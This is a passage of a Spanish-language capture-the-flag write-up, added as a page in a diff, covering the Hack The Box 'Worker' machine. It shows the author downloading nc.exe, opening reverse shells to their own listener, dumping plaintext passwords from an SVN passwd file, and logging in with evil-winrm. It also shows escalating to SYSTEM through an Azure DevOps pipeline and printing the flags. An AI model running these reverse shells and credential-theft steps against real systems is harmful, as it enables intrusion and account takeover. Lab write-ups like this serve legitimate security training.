+  <li>Ahora simplemente hacemos una petición con <code class="language-plaintext highlighter-rouge">curl</code> para descargamos el nc.exe y ponerlo en esa ruta del sistema.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/18.png" />
+</p>
+
+<ul>
+  <li>Ahora ya nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd tuip 443
+</code></pre></div></div>
+
+<ul>
+  <li>Nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 50333
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
+<span class="nb">whoami
+</span>iis apppool<span class="se">\d</span>efaultapppool
+
+c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-robisl">Shell as robisl</h2>
+
+<ul>
+  <li>Aquí vemos unidades logicas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;net share
+net share
+
+Share name   Resource                        Remark
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+C<span class="nv">$ </span>          C:<span class="se">\ </span>                            Default share
+IPC<span class="nv">$ </span>                                        Remote IPC
+W<span class="nv">$ </span>          W:<span class="se">\ </span>                            Default share
+ADMIN<span class="nv">$ </span>      C:<span class="se">\W</span>indows                      Remote Admin
+The <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;w:
+w:
+
+W:<span class="se">\&gt;</span><span class="nb">dir
+dir
+ </span>Volume <span class="k">in </span>drive W is Work
+ Volume Serial Number is E82A-AEA8
+
+ Directory of W:<span class="se">\</span>
+
+2020-06-16  18:59    &lt;DIR&gt;          agents
+2020-03-28  15:57    &lt;DIR&gt;          AzureDevOpsData
+2020-04-03  11:31    &lt;DIR&gt;          sites
+2020-06-20  16:04    &lt;DIR&gt;          svnrepos
+               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
+               4 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free
+
+W:<span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos un <code class="language-plaintext highlighter-rouge">passwd</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\&gt;</span><span class="nb">cd </span>svnrepos
+<span class="nb">cd </span>svnrepos
+
+W:<span class="se">\s</span>vnrepos&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive W is Work
+ Volume Serial Number is E82A-AEA8
+
+ Directory of W:<span class="se">\s</span>vnrepos
+
+2020-06-20  16:04    &lt;DIR&gt;          <span class="nb">.</span>
+2020-06-20  16:04    &lt;DIR&gt;          ..
+2020-06-20  11:29    &lt;DIR&gt;          www
+               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
+               3 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free
+
+W:<span class="se">\s</span>vnrepos&gt;cd www
+<span class="nb">cd </span>www
+
+W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive W is Work
+ Volume Serial Number is E82A-AEA8
+
+ Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww
+
+2020-06-20  11:29    &lt;DIR&gt;          <span class="nb">.</span>
+2020-06-20  11:29    &lt;DIR&gt;          ..
+2020-06-20  15:30    &lt;DIR&gt;          conf
+2020-06-20  15:52    &lt;DIR&gt;          db
+2020-06-20  11:29                 2 format
+2020-06-20  11:29    &lt;DIR&gt;          hooks
+2020-06-20  11:29    &lt;DIR&gt;          locks
+2020-06-20  11:29               251 README.txt
+               2 File<span class="o">(</span>s<span class="o">)</span>            253 bytes
+               6 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free
+
+W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww&gt;cd conf
+<span class="nb">cd </span>conf
+
+W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir
+<span class="nb">dir
+ </span>Volume <span class="k">in </span>drive W is Work
+ Volume Serial Number is E82A-AEA8
+
+ Directory of W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf
+
+2020-06-20  15:30    &lt;DIR&gt;          <span class="nb">.</span>
+2020-06-20  15:30    &lt;DIR&gt;          ..
+2020-06-20  11:29             1112 authz
+2020-06-20  11:29               904 hooks-env.tmpl
+2020-06-20  15:27             1031 passwd
+2020-04-04  20:51             4454 svnserve.conf
+               4 File<span class="o">(</span>s<span class="o">)</span>          7501 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>  18767577088 bytes free
+
+W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos usuarios y contraseñas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;type passwd
+<span class="nb">type </span>passwd
+<span class="c">### This file is an example password file for svnserve.</span>
+<span class="c">### Its format is similar to that of svnserve.conf. As shown in the</span>
+<span class="c">### example below it contains one section labelled [users].</span>
+<span class="c">### The name and password for each user follow, one account per line.</span>
+
+<span class="o">[</span><span class="nb">users</span><span class="o">]</span>
+nathen <span class="o">=</span> wendel98
+nichin <span class="o">=</span> fqerfqerf
+nichin <span class="o">=</span> asifhiefh
+noahip <span class="o">=</span> player
+nuahip <span class="o">=</span> wkjdnw
+oakhol <span class="o">=</span> bxwdjhcue
+owehol <span class="o">=</span> supersecret
+paihol <span class="o">=</span> painfulcode
+parhol <span class="o">=</span> gitcommit
+pathop <span class="o">=</span> iliketomoveit
+pauhor <span class="o">=</span> nowayjose
+payhos <span class="o">=</span> icanjive
+perhou <span class="o">=</span> elvisisalive
+peyhou <span class="o">=</span> ineedvacation
+phihou <span class="o">=</span> pokemon
+quehub <span class="o">=</span> pickme
+quihud <span class="o">=</span> kindasecure
+rachul <span class="o">=</span> guesswho
+raehun <span class="o">=</span> idontknow
+ramhun <span class="o">=</span> thisis
+ranhut <span class="o">=</span> getting
+rebhyd <span class="o">=</span> rediculous
+reeinc <span class="o">=</span> iagree
+reeing <span class="o">=</span> tosomepoint
+reiing <span class="o">=</span> isthisenough
+renipr <span class="o">=</span> dummy
+rhiire <span class="o">=</span> <span class="nb">users
+</span>riairv <span class="o">=</span> canyou
+ricisa <span class="o">=</span> seewhich
+robish <span class="o">=</span> onesare
+robisl <span class="o">=</span> wolves11
+robive <span class="o">=</span> andwhich
+ronkay <span class="o">=</span> onesare
+rubkei <span class="o">=</span> the
+rupkel <span class="o">=</span> sheeps
+ryakel <span class="o">=</span> imtired
+sabken <span class="o">=</span> drjones
+samken <span class="o">=</span> aqua
+sapket <span class="o">=</span> hamburger
+sarkil <span class="o">=</span> friday
+
+W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que el único usuario de interés es <code class="language-plaintext highlighter-rouge">robisl</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;dir C:<span class="se">\U</span>sers<span class="se">\</span>
+<span class="nb">dir </span>C:<span class="se">\U</span>sers<span class="se">\</span>
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 32D6-9041
+
+ Directory of C:<span class="se">\U</span>sers
+
+2020-07-07  17:53    &lt;DIR&gt;          <span class="nb">.</span>
+2020-07-07  17:53    &lt;DIR&gt;          ..
+2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5
+2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5 Classic
+2020-08-18  00:33    &lt;DIR&gt;          Administrator
+2020-03-28  15:01    &lt;DIR&gt;          Public
+2020-07-22  01:11    &lt;DIR&gt;          restorer
+2020-07-08  19:22    &lt;DIR&gt;          robisl
+               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
+               8 Dir<span class="o">(</span>s<span class="o">)</span>  10459025408 bytes free
+
+W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>El usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>W:<span class="se">\s</span>vnrepos<span class="se">\w</span>ww<span class="se">\c</span>onf&gt;net user robisl
+net user robisl
+User name                    robisl
+Full Name                    Robin Islip
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2020-04-05 21:27:26
+Password expires             Never
+Password changeable          2020-04-05 21:27:26
+Password required            No
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2020-08-03 12:41:02
+
+Logon hours allowed          All
+
+Local Group Memberships      *Production           *Remote Management Use
+Global Group memberships     *None
+The command completed successfully.
+
+
+W:\svnrepos\www\conf&gt;
+</span></code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Ahora ya nos podemos conectar y ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.10.203 <span class="nt">-u</span> <span class="s1">'robisl'</span> <span class="nt">-p</span> <span class="s1">'wolves11'</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>worker<span class="se">\r</span>obisl
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
+2ce8a9d7ff7736acc3469f7274b2006a
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>No vemos ningún privilegio ni nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>obisl<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all
+
+USER INFORMATION
+<span class="nt">----------------</span>
+
+User Name     SID
+<span class="o">=============</span> <span class="o">==============================================</span>
+worker<span class="se">\r</span>obisl S-1-5-21-3082756831-2119193761-3468718151-1330
+
+
+GROUP INFORMATION
+<span class="nt">-----------------</span>
+
+Group Name                             Type             SID                                            Attributes
+<span class="o">======================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">==================================================</span>
+Everyone                               Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+WORKER<span class="se">\P</span>roduction                      Alias            S-1-5-21-3082756831-2119193761-3468718151-1018 Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\R</span>emote Management Users        Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\U</span>sers                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>ETWORK                   Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\T</span>his Organization         Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\L</span>ocal account             Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>TLM Authentication       Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label<span class="se">\M</span>edium Mandatory Level Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+</code></pre></div></div>
+
+<ul>
+  <li>Si recordamos tenemos credenciales y si nos conectamos al <code class="language-plaintext highlighter-rouge">devops.worker.htb</code> con las credenciales son validas.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/19.png" />
+</p>
+
+<ul>
+  <li>Formamos parte del grupo <code class="language-plaintext highlighter-rouge">Build Administrators</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/20.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Podemos crear un <code class="language-plaintext highlighter-rouge">Pipeline</code>.</p>
+  </li>
+  <li>
+    <p>Después le damos en <code class="language-plaintext highlighter-rouge">PartsUnlimited</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/21.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/22.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Podemos hacer un script en YAML.</p>
+  </li>
+  <li>
+    <p>Si vemos en la parte de script se están ejecutando comandos podemos hacer un <code class="language-plaintext highlighter-rouge">whoami</code> para ver quien es el que esta ejecutando el script.</p>
+  </li>
+  <li>
+    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Save and Rune</code> vemos el mismo problema que teníamos antes.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/23.png" />
+</p>
+
+<ul>
+  <li>Así que vamos a crear una nueva rama.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/24.png" />
+</p>
+
+<ul>
+  <li>Pero obtenemos un error.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/25.png" />
+</p>
+
+<ul>
+  <li>Vemos que nos dicen sobre el <code class="language-plaintext highlighter-rouge">pool</code> que no existe default a si que tenemos que buscar uno que exista.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/26.png" />
+</p>
+
+<ul>
+  <li>Vamos a cambiar el <code class="language-plaintext highlighter-rouge">pool</code> y hacemos lo mismo de cambiar la rama.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/27.png" />
+</p>
+
+<ul>
+  <li>Si le damos a <code class="language-plaintext highlighter-rouge">Run</code> vemos que funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/28.png" />
+</p>
+
+<ul>
+  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> al <code class="language-plaintext highlighter-rouge">#....</code> vemos que lo ejecuta el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/29.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos a editar el <code class="language-plaintext highlighter-rouge">Pipeline</code> para hacer todo lo anterior y enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
+  </li>
+  <li>
+    <p>En mi caso volví a subir el <code class="language-plaintext highlighter-rouge">nc.exe</code> así que nos enviamos una reverse ahora.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/30.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Hacemos todo el proceso de antes de crear una nueva rama.</p>
+  </li>
+  <li>
+    <p>Después de que se procese todo nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.203] 49935
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.1282]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span><span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+W:<span class="se">\a</span>gents<span class="se">\a</span>gent11<span class="se">\_</span>work<span class="se">\8\s</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="roottxt">Root.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+d3a78316ac7f36f03c0e6dd2ada48da9
+C:<span class="se">\&gt;</span>
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/05/17/worker.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
